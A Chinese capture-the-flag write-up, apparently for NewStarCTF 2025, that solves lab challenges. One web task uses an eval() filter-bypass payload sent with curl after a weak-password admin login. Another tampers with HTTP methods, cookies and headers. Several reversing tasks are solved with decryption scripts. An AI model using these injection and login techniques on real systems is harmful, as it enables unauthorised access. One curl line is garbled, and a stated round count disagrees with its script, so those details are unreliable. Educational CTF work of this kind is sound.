1. 允许的字符：数字、`*`、`/`、`~`、`(`、`)` 和空格。   其它字母、符号会直接被拒绝。  
2. 不允许纯数字：必须是一个表达式。 
3. 用 `eval()` 执行，结果必须等于 `2025`。  

 绕过思路目标就是构造一个算式，结果为 2025。但直接写 `2025` 会被拦（因为纯数字）。  可以用位运算符 `~`（按位取反）来构造。 

例如：  `~2024 = -2025`   所以写 `(~2024)*-1` 可以得到 `2025`。 但注意只能用允许字符：有 `*`、`/`、`~`、`()`，没有 `-`。  巧用 `~`：   `~2024 = -2025`     `~~2024 = 2024`   所以 `(~2024) * (~0)`：   `~0 = -1   (~2024) = -2025`   两个相乘 = `2025`  

 所以这里构造`?newstar=(~2024)*(~0)`这会让 `$test = 2025`

接着用`curl`发包

```
curl -s -b cookies.txt -c cookies.txt -L \xt -L \
  -H "Referer: ${HOST}/weak_password.php" \
  --data "username=admin&password=111111" \
  "${HOST}/weak_password.php" > /dev/null
```

```
curl -s -b cookies.txt -c cookies.txt \
  -H "Referer: ${HOST}/portal.php" \
  "${HOST}/portal.php?newstar=%28%7E2024%29*%28%7E0%29" | tee portal.html
```

得到以下代码，成功得到`flag`

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>轻轻松松绕</title>
</head>
<body>
    <div class="portal-container">
        <h1>轻轻松松绕</h1>
        <p>真的很轻松</p>
        
        <h2>源码</h2>
        <div class="code-container">
<div class="code-container"> 
    <pre class="php-code">&lt;?php
error_reporting(0);

function generate_dynamic_flag($secret) {
    return getenv("ICQ_FLAG") ?: 'default_flag';
}


if (isset($_GET['newstar'])) {
    $input = $_GET['newstar'];
    
    if (is_array($input)) {
        die("恭喜掌握新姿势");
    }
    

    if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }
    

    if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }
    
    $test = 0;
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }
    
    if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "&lt;div class='success'&gt;拿下flag！&lt;/div&gt;";
        echo "&lt;div class='flag-container'&gt;&lt;div class='flag'&gt;FLAG: {$flag}&lt;/div&gt;&lt;/div&gt;";
    } else {
        echo "&lt;div class='error'&gt;大哥哥泥把数字算错了: $test ≠ 2025&lt;/div&gt;";
    }
} else {
    ?&gt;
&lt;?php } ?&gt;</pre>
        </div>
        
        <div class='result success'>拿下flag！</div><div class='flag-container'><div class='flag'>FLAG: flag{36c67a7a-8312-4d69-ab8c-99d5364e450f}</div><p>欢迎你newstar！</p></div>    </div>
</body>
</html>
```

**flag**

```
flag{36c67a7a-8312-4d69-ab8c-99d5364e450f}
```





### 黑客小W的故事（1）

访问页面

点提示说要抓包

用`yakit`抓包看看，发现了`body`中有`count`的属性，直接修改数量发包，得到下一关的地址

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401776.png)

进入第二关，点击提示，说要找回骨钉

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402513.png)

进入页面和蘑菇先生对话，发现它在胡言乱语，接着看提示

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402369.png)

说是要用`get`传参

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402308.png)

这里说要说什么用`POST`方法说

在`yakit`中抓包修改方法为`POST`，加一个参数`guding`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402341.png)

蘑菇先生说要帮他把虫子去掉

接着修改方法为`DELETE`，参数为`chongzi`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402213.png)

接着修改方法为`POST`，再传`guding`参数

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402930.png)

得到下一步的地址`/Level2_END`，进入发现会被重定向到`/Level2_mato`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402024.png)

抓包看看过程

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402133.png)

发现这里给我们成功的提示时有一个`Set-Cookie`属性，我们解码两个`cookie`可以发现，`cookie`中设置了当前关卡的等级

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402781.png)

我们复制这个`cookie`修改当前页面的`cookie`，刷新页面进入第三关

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402684.png)

接着进入第三关，要我们使用出上一关教我们的旋风斩

看下提示

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131402234.png)

说是要修改`User-Agent`,我们修改头为`CycloneSlash`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403336.png)

这里说我们的是盗版的

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403964.png)

这里应该是说我们的`User-Agent`不是标准的格式，修改一下

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403330.png)

这里说不是最新的，修改为`2.0`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403733.png)

还要`DashSlash`

这里直接抓一个包看一下标准的`User-Agent`,发现直接在标准的格式上修改就可以

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403098.png)

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403415.png)

进入第四关得到`flag`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131403963.png)

**flag**

```
flag{45352a14-52df-4318-858e-d8f8a267fe7e}
```





# Week2 

## RE

### OhNativeEnc

使用`apktool`将程序解包

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032013398.png)

题目上说**安卓的native代码在哪呢**，安卓的`native`代码在so文件中，题目的主函数也做了提示

![image-20251013145225808](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007907.png)

而so库文件在解包后的lib文件中

![image-20251013144849302](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007558.png)

这里直接使用ida反编译这个so文件

![image-20251013144956556](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007562.png)

分析这个函数

这个 so 函数实现其实是JNI + TEA 加密算法

函数原型：

```c
char __fastcall Java_work_pangbai_ohnativeenc_FirstFragment_checkFlag(__int64 env, __int64 thiz, __int64 jstring_input)
```

它是 JNI 函数 `FirstFragment.checkFlag(String input)` 对应的 native 实现。

主要做了几件事：

1. 从 Java 层取字符串 `input`；
2. 打印日志（`__android_log_print`）；
3. 拷贝前 32 字节（`strncpy(dest, v3, 0x20)`）；
4. 把这些字节分成多个 4 字节整数；
5. 进行若干轮复杂运算；
6. 最后将结果与全局数组 `mm` 比对。

在so文件中这一段循环是核心：

```c
for ( i = 114514; i != 1488682; i += 114514 )
{
    v13 = (i >> 2) & 3;
    v14 = *(int *)&aThisisaxxteake[4 * v13];

    v5  += (((v4 >> 5) ^ (4 * v6)) + ((v6 >> 3) ^ (16 * v4))) ^ ((i ^ v6) + (v14 ^ v4));
    v6  += (((v5 >> 5) ^ (4 * v11)) + ((v11 >> 3) ^ (16 * v5))) ^ ((i ^ v11) + (v5 ^ *(int *)&aThisisaxxteake[4 * ((i >> 2) & 3 ^ 1)]));
    v11 += (((v6 >> 5) ^ (4 * v7)) + ((v7 >> 3) ^ (16 * v6))) ^ ((i ^ v7) + (v6 ^ *(int *)&aThisisaxxteake[4 * ((i >> 2) & 3 ^ 2)]));
    v7  += (((v11 >> 5) ^ (4 * v21)) + ((v21 >> 3) ^ (16 * v11))) ^ ((i ^ v21) + (v11 ^ *(int *)&aThisisaxxteake[4 * ((i >> 2) & 3 ^ 3)]));
    ...
}
```

> 这一看就是 **TEA / XXTEA 的加密过程**，其中 `aThisisaxxteake` 是密钥。

`delta = 114514`
 循环终止条件 `i != 1488682`，也就是执行 `1488682 / 114514 = 13` 轮（13 轮 XXTEA）。



`dest` 是输入 flag 的前 32 字节；

```c
v5  = *(int*)&dest[0];
v6  = *(int*)&dest[4];
v11 = *(int*)&dest[8];
v7  = *(int*)&dest[12];
...
```

这 8 个寄存器构成了 32 字节（8 × 4B）的明文块，典型的 **XXTEA 分组结构**。

查看`aThisisaxxteake`中存放的字符串

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007496.png)

也就是密钥是`ThisIsAXXteaKey`

完成加密后：

```c
if (dest[i] != mm[i])  return 0;  // 校验失败
else                   return 1;  // 校验通过
```

输入 flag 经 XXTEA 加密后（密钥 “ThisIsAXXteaKey”，13 轮，delta=114514），结果必须与全局常量 `mm` 完全一致。

查看mm数组的内容

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007601.png)

要得到 flag，只需执行逆过程：

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007769.png)

**flag**

```
flag{Ur_G00d_@_n@tive_Func}
```



##### exp

```python
import struct

DELTA = 114514
ROUNDS = 12          
KEY = b"ThisIsAXXteaKey" 

MM = bytes([
    0xB6,0x53,0x6E,0x4D, 0x77,0x5D,0x08,0xD2,
    0xFB,0x2C,0x63,0x1E, 0xBB,0x7B,0x01,0x9B,
    0xF5,0x04,0x6A,0xF4, 0x0E,0x84,0x27,0x47,
    0x64,0xA1,0xE4,0xD9, 0xEF,0x12,0x44,0x37
])

def normalize_key(k):
    if len(k) == 16:
        return k
    if len(k) == 15:
        return k + b'\x00'  
    raise ValueError("KEY must be 15 (will be padded) or 16 bytes; got %d" % len(k))

def xxtea_decrypt_block_8words(mm_bytes, key_bytes, delta=DELTA, rounds=ROUNDS):
    assert len(mm_bytes) == 32, "mm must be 32 bytes"
    key_bytes = normalize_key(key_bytes)
    v = list(struct.unpack('<8I', mm_bytes))
    k = list(struct.unpack('<4I', key_bytes))
    mask = 0xFFFFFFFF
    sum_ = (delta * rounds) & mask
    while sum_ != 0:
        e = (sum_ >> 2) & 3
        for p in range(7, -1, -1):
            y = v[(p + 1) & 7]
            z = v[(p - 1) & 7]
            mx = (((z >> 5) ^ ((y << 2) & mask)) + ((y >> 3) ^ ((z << 4) & mask))) ^ ((sum_ ^ y) + (k[(p & 3) ^ e] ^ z))
            mx &= mask
            v[p] = (v[p] - mx) & mask
        sum_ = (sum_ - delta) & mask
    return struct.pack('<8I', *v)

if __name__ == "__main__":
    plain = xxtea_decrypt_block_8words(MM, KEY)
    print(plain.rstrip(b'\x00').decode('utf-8'))
```



### 尤皮·埃克斯历险记（1）

题目中就提到了UPX，猜测程序应该是使用UPX加壳了

使用Exeinfo查看一下

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032007526.png)

果然是使用UPX加壳了

使用UPX脱壳

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008432.png)

脱壳后使用ida反编译

![image-20251013150136730](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008492.png)



程序的主要逻辑：

1. 程序把一段常量数据写到栈上：
   - `v17`：4 个 64-bit 常量（共 32 字节）
   - `v18 = 16753`（2 字节，小端）
   - `v21 = 34`（规定输入长度）
2. 程序读取用户输入到 `v16`，然后调用 `encrypt()`，输出结果存到 `v15`。
3. 校验：
   - 检查 `v15` 长度是否为 34。
   - 若不等于 34 → 输出 “Wrong!”。
   - 若等于 34 → 逐字节比较。

校验逻辑：

```
if (IsDebuggerPresent())
    (v15[i] ^ 0xC3) == *((BYTE*)v17 + i);
else
    (v15[i] ^ 0x3C) == *((BYTE*)v17 + i);
```

可见：

- 调试模式下异或常数为 **0xC3**
- 非调试模式下异或常数为 **0x3C**

因此在非调试状态：

```
v15[i] = *((BYTE*)v17 + i) ^ 0x3C
```

由于 `v17`（32 字节）+ `v18`（2 字节）刚好 34 字节，
 所以拼出完整常量 `K`：

```
K = bytes(v17) + bytes(v18)
```

这里把 `v17`（4×8 字）和 `v18`（0x4121）按小端拼接后，与 `0x3C` 异或，得到的结果就是程序要匹配的 34 字节字符串：

```python
v17 = [0x74094A4768667369, 0x54750A790A55637E, 0x6A637E54096A636A, 0x5047B777E756451]
# 把每个 64-bit 用小端拆成 8 字节并拼接
data = b''.join(val.to_bytes(8,'little') for val in v17)
v18 = 16753
data += v18.to_bytes(2,'little')   # 小端两字节
flag_bytes = bytes([b ^ 0x3C for b in data])  # 非调试分支用 0x3C
print(flag_bytes.decode())
```

得到：

```
UOZT{v5HB_i6E6IhV_V5hB_VmXIBKG89M}
```

接着跟进`encrypt`函数

![image-20251013150316079](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008366.png)

对输入的每个字符：

- 若是数字 `'0'..'9'`：输出 `105 - ch`
   （即数字互补：0↔9，1↔8，2↔7）
- 若是字母：输出 `187 - ch`
   （等价于 Atbash + 大小写互换）
- 其他字符保持不变。

**特点：**
 该映射是自反的，即：

```
encrypt(encrypt(x)) = x
```

接着就可以还原真正的 flag

由主程序得：

```
v15 = encrypt(flag)
```

因此：

```
flag = encrypt(v15_expected)
```

执行：

```
def encrypt(ch):
    if ch.isdigit():
        return chr(105 - ord(ch))
    elif ch.isalpha():
        return chr(187 - ord(ch))
    else:
        return ch

v15 = "UOZT{v5HB_i6E6IhV_V5hB_VmXIBKG89M}"
flag = ''.join(encrypt(c) for c in v15)
print(flag)
```

这里就可以得到`flag`



**flag**

```
flag{E4sy_R3v3rSe_e4Sy_eNcrypt10n}
```



### Look at me carefully

使用ida反编译程序

![image-20251013151115943](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008625.png)

1. 固定常量串 v7
    程序一开始把常量拷贝到 `v7`：

   ```
   "cH4_1elo{ookte?0dv_}alafle___5yygume"
   ```

   这个串长度为 **36**。

2. 读取输入 v8 并做长度校验
    `v8` 用 `memset` 清零后从标准输入读入字符串，然后用下面这个“脑筋急转弯”的方式检查长度：

   ```c
   &v8[strlen(v8) + 1] - &v8[1] == 36
   ```

   等价于 `strlen(v8) == 36`，也就是输入必须是 36 个字符。

3. 构造 v6 并比较
    之后多次调用 `sub_4016E0(v6, v8, idx);`，最后用 `sub_401880(v6, v7)` 做比较，成功则通过。
    直觉上，`sub_4016E0` 按给定的下标 `idx` 从输入 `v8` 取字符，按调用顺序“拼接/放置”进 `v6`；`sub_401880` 则检查 `v6` 是否与常量串 `v7` 相等。

4. 一长串下标就是一个置换（Permutation）
    关键的下标序列是：

   ```
   27, 5, 6, 9, 28, 18, 32, 29, 4, 11, 15, 17, 22, 8, 34, 16,
   19, 7, 26, 35, 2, 14, 21, 0, 1, 25, 13, 23, 20, 37, 30, 33,
   10, 3, 12, 36, 24, 31
   ```

   其中出现了 36 和 37两个大于等于 36 的下标——由于输入长度被严格限制为 36，常见实现里当 `idx >= 36` 时取到的是 `'\0'` 或直接不会计入有效比较（也就是可忽略）。因此求解时只要考虑 < 36 的下标即可。

所以这里的还原思路就是一个逆置换

把上面的序列里 小于 36 的部分按顺序记为 `P`：

```
P = [27, 5, 6, 9, 28, 18, 32, 29, 4, 11, 15, 17,
     22, 8, 34, 16, 19, 7, 26, 35, 2, 14, 21, 0,
     1, 25, 13, 23, 20, 30, 33, 10, 3, 12, 24, 31]
```

`sub_4016E0` 的效果可以等价理解为：

```
out = "".join( v8[i] for i in P )
```

程序要求 `out == v7`，所以反过来就能把 `v7` 的字符放回输入的正确位置：

> 对于 j = 0..35：令 `v8[P[j]] = v7[j]`。

按上面逆置换把 `v7` 放回去，就可以得到flag

```python
v7 = "cH4_1elo{ookte?0dv_}alafle___5yygume"
P  = [27,5,6,9,28,18,32,29,4,11,15,17,22,8,34,16,19,7,26,35,2,14,21,0,1,25,13,23,20,30,33,10,3,12,24,31]

# 逆置换：把 v7 的第 j 个字符放到输入的第 P[j] 位
flag = ['?']*36
for j, idx in enumerate(P):
    flag[idx] = v7[j]
print("".join(flag))
```

![image-20251013151441246](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008229.png)

**flag**

```
flag{H4ve_you_lo0ked_at_me_c1o5ely?}
```



### Forgotten_Code

题目给了一个.s后缀的文件，使用Visual Studio打开文件

![image-20251013151753666](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008129.png)

![image-20251013152442505](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009281.png)

给出的是一段汇编（Intel 语法），明显是由 MinGW 编译的 C++ 程序反汇编而来。通过阅读发现主要逻辑集中在三个函数：

- `_Z2fnPj`：一个对 8 字节数据块进行加密的函数；
- `main`：对输入的 `flag{...}` 进行格式校验、分块加密并与常量数组比对；
- 全局数据段 `ng` 和 `ezgm`：分别是密钥相关数据和目标密文。

尝试对程序流程复原

![image-20251013152418509](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032008141.png)

首先是flag 检查部分

程序首先读取输入字符串，然后依次进行：

检查是否以 `flag{` 开头，是否以 `}` 结尾，花括号内的内容是否为 32 字节长度。

如果长度不等于 32，则直接输出：

```
Wrong length!
```



然后是加密逻辑 (`_Z2fnPj`)函数

反汇编表明：

- 循环中先把全局数组 `ng` 的每个字节 `xor 17`；
- 然后进行一个包含 32 轮的运算，模式与 **Tiny Encryption Algorithm (TEA)** 完全一致；
- `delta = 0x9E3779B9 (即 -1640531527)`；
- 每次调用 `fn` 都会改变 `ng` 的状态（因为 xor 17 再写回）。

也就是说：

- 第一次调用 `fn` 使用解密后的密钥；
- 第二次调用 `fn` 再次 xor，密钥回到原样；
- 第三次调用再 xor，密钥又变成第一次的样子……

也就是说密钥交替使用

全局数据中有两部分关键内容：

![image-20251013152315997](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009388.png)

```
ng:   "sp\177vuctp|xeb|hv~"
ezgm: 1210405119, 710975774, -90350153, -1958008304,
       -745722482, 67707510, -86515270, -1728462407
```

`ng` 是密钥字符串，经 `xor 0x11` 后会变成：

```
b a n g d r e a m i t s m y g o
```

也就是 `"bangdreamitsmygo"`。

因此：

- 奇数次加密：使用 `"bangdreamitsmygo"`
- 偶数次加密：使用原始 `"sp\177vuctp|xeb|hv~"`

尝试还原算法：

每 8 字节（两个 `uint32_t`）为一块：

```
void fn(uint32_t *v) {
    // xor 密钥
    for (int i = 0; i <= 15; i++)
        ng[i] ^= 17;

    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0, delta = 0x9E3779B9;
    uint32_t k0 = *(uint32_t*)(ng+0),
             k1 = *(uint32_t*)(ng+4),
             k2 = *(uint32_t*)(ng+8),
             k3 = *(uint32_t*)(ng+12);

    for (int i = 0; i < 32; i++) {
        sum += delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
    }

    v[0] = v0; v[1] = v1;
}
```

- 把 `flag{...}` 中的内容（去掉前后括号）分成 8 个 8 字节块；
- 依次调用 `fn`；
- 然后把结果与 `ezgm` 中的 8×4 字节进行对比；
- 全部匹配则输出 `"Right!"`。

这里要得到flag，只需把加密逆向即可：

1. 从 `ezgm` 中取出 8 个块；
2. 第 1、3、5、7 块用密钥 `"bangdreamitsmygo"`；
3. 第 2、4、6、8 块用原始密钥 `"sp\177vuctp|xeb|hv~"`；
4. 对每块执行 TEA **解密 32 轮**。

![image-20251013153007599](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009101.png)

##### exp

```python
from struct import pack, unpack

def tea_decrypt(v, k):
    delta = 0x9E3779B9
    v0, v1 = v
    sum = (delta * 32) & 0xFFFFFFFF
    for _ in range(32):
        v1 = (v1 - (((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
        v0 = (v0 - (((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
        sum = (sum - delta) & 0xFFFFFFFF
    return v0, v1

def key_from_str(s):
    # 小端序读取
    return list(unpack("<4I", s.encode()))

# 密文
ezgm = [
    1210405119,
    710975774,
    -90350153,
    -1958008304,
    -745722482,
    67707510,
    -86515270,
    -1728462407,
]
ezgm = [(x + (1 << 32)) & 0xFFFFFFFF for x in ezgm]

# 两个密钥交替
key1 = "bangdreamitsmygo"
key2 = "sp\177vuctp|xeb|hv~"

k_decoded = key_from_str(key1)
k_raw = key_from_str(key2)

flag = b""

for i in range(0, len(ezgm), 2):
    block = (ezgm[i], ezgm[i + 1])
    k = k_decoded if (i // 2) % 2 == 0 else k_raw
    v0, v1 = tea_decrypt(block, k)
    flag += pack("<2I", v0, v1)

print("flag{" + flag.decode('ascii') + "}")
```



**flag**

```
flag{4553m81y_5_s0o0o0_345y_jD5yQ5mD9}
```





### 采一朵花，送给艾达（1）

使用ida打开程序，反编译不出来

![image-20251013153128320](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009307.png)

这里应该是有花指令

尝试还原代码，没有还原出来，这里直接看汇编代码

![image-20251013153220988](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009021.png)

程序要求输入长度恰好为 `0x28`（40）字节的字符串。输入被复制到缓冲并经过一个自定义变种 RC4 的加密（**加法流密码**），加密结果逐字节与程序内置的 40 字节目标密文比较；全匹配则输出 `Right flag!`，否则输出 `Wrong flag!`。

程序还包含大量“junk codes”（用 `jz/jnz/call`、db、adc、mov al, ds:... 等制造的假指令/数据）来混淆静态分析。函数里说明了这些技巧。

1. **长度检查**：`strlen(input) == 0x28`，否则退出并打印 `Wrong length!`。
2. **目标密文（40 字节）**分成 5 个 qword（小端），其中后 3 个由显式 `mov rax, imm64` 装载；前 2 个通过“junk code”伪装为字节表然后被存入内存。经过两次核对，正确的 5 个 qword（按小端）是：

![image-20251013154709083](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009068.png)

```text
0x1175640343C17FC7,
0xDF23C0F694ACB888,
0xF2F082F69E2E0F4D,
0xE1278329086B51BC,
0x4E4F80B188C6BDCB
```

字符串常量为 `"EasyJunkCodes"`，长度 12，通过 `strlen` 传入 KSA。程序在 `main` 中把该地址传入 `rc4_init`。

变种 RC4 实现：

![image-20251013154212822](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032009383.png)

- S 盒初始值不是 `S[i]=i`，而是 `S[i] = (-i) & 0xFF`（即序列 `0, 255, 254, ..., 1`）。
- KSA（密钥调度）形式与 RC4 相同：`j = (j + S[i] + key[i % keylen]) & 0xFF; swap(S[i], S[j])`。
- PRGA（伪随机字节流生成）与 RC4 一致，但**加密操作为加法**：`buf[k] = (buf[k] + K) & 0xFF`，而非常见的 `buf[k] ^= K`。

因此解密时应做 `P[i] = (C[i] - K[i]) & 0xFF`。



1. 从程序反汇编处读取并复原 5 个 qword（如上）。前两 qword 被 junk bytes 伪装，需在 IDA 里把那段强制视为数据或手动组合小端字节。
2. 用 key `EasyJunkCodes` 重现 `rc4_init`（S 初值为 `(-i)&0xFF`），运行 KSA 获得 S。
3. 运行 PRGA 生成与明文长度相同的密钥流字节序列 `K[i]`。
4. 对每个字节做减法：`P[i] = (C[i] - K[i]) & 0xFF`。
5. 将字节流解码为 ASCII，即得到明文 flag。

##### exp

```python
from typing import List

def rc4_keystream(key: bytes, n: int) -> List[int]:
    # S[i] = (-i) & 0xFF  ->  0,255,254,...,1
    S = [0] + [ (256 - i) & 0xFF for i in range(1,256) ]
    j = 0
    # KSA
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    # PRGA
    i = 0
    j = 0
    out = []
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) & 0xFF
        out.append(S[t])
    return out


def qwords_le_to_bytes(qws: List[int]) -> bytes:
    out = bytearray()
    for q in qws:
        for k in range(8):
            out.append((q >> (8*k)) & 0xFF)
    return bytes(out)

qwords = [
    0x1175640343C17FC7,
    0xDF23C0F694ACB888,
    0xF2F082F69E2E0F4D,
    0xE1278329086B51BC,
    0x4E4F80B188C6BDCB,
]
C = qwords_le_to_bytes(qwords)

key = b"EasyJunkCodes"

K = rc4_keystream(key, len(C))
P = bytes((c - k) & 0xFF for c, k in zip(C, K))

print("flag", P)
```



**flag**

```
flag{Junk_C0d3s_4Re_345y_t0_rEc0gn1Ze!!}
```




